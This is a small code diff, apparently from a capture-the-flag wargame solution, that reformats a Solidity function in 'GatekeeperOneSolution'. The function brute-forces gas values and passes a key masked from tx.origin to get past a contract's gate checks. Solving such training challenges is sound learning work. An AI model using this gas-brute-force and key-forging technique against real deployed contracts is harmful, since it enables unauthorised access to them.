@@ -10,7 +10,9 @@ contract GatekeeperOneSolution {
 
     function solve() external {
         for (uint256 i = 0; i < 1000; i++) {
-            try instance.enter{gas: 3 * 8191 + i}(bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF)) returns(bool) {
+            try instance.enter{gas: 3 * 8191 + i}(bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF)) returns (
+                bool
+            ) {
                 return;
             } catch {
                 continue;
